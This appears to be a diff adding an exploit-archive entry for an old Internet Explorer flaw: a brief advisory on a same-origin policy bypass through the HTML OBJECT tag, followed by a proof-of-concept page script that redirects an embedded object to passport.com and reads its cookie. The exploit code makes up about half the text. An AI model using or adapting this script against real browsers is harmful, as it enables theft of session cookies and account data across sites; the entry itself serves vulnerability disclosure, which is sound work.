@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/5196/info
+
+Microsoft Internet Explorer allows script code to violate the same origin policy through usage of the HTML OBJECT tag. Malicious script code may obtain a legitimate reference to an embedded object containing a web page from the same domain. This script may then change the location of the embedded object to a sensitive page, and maintain the reference to the object. This provides full access to the DOM of the embedded page. 
+
+<object id="data" data="empty.html" type="text/html"></object>
+<script>
+var ref=document.getElementById("data").object;
+ref.location.href = "http://www.passport.com";
+setTimeout("alert(ref.cookie)",5000);
+</script>
